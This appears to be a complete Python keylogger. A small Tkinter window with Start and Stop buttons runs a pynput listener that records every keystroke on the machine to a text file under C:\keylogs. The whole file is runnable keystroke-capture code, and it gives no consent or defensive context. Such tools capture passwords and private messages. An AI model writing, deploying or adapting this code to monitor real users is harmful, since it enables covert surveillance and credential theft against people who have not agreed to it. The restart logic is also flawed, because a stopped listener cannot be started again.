import os
import tkinter as tk
from tkinter import scrolledtext
from pynput import keyboard
log_dir = "C:\\keylogs"
if not os.path.exists(log_dir):
    os.makedirs(log_dir)
log_file = os.path.join(log_dir, "keylogs.txt")
def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}\t{key}\n")
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f"{key}\t{key}\n")
class KeyloggerApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Keylogger")
        self.text_area = scrolledtext.ScrolledText(root, wrap=tk.WORD, width=50, height=15)
        self.text_area.pack(padx=10, pady=10)
        self.start_button = tk.Button(root, text="Start Keylogger", command=self.start_keylogger)
        self.start_button.pack(pady=5)
        self.stop_button = tk.Button(root, text="Stop Keylogger", command=self.stop_keylogger)
        self.stop_button.pack(pady=5)
        self.listener = keyboard.Listener(on_press=on_press)
    def start_keylogger(self):
        self.listener.start()
        self.text_area.insert(tk.END, "Keylogger started...\n")
    def stop_keylogger(self):
        self.listener.stop()
        self.text_area.insert(tk.END, "Keylogger stopped.\n")
if __name__ == "__main__":
    root = tk.Tk()
    app = KeyloggerApp(root)
    root.mainloop()
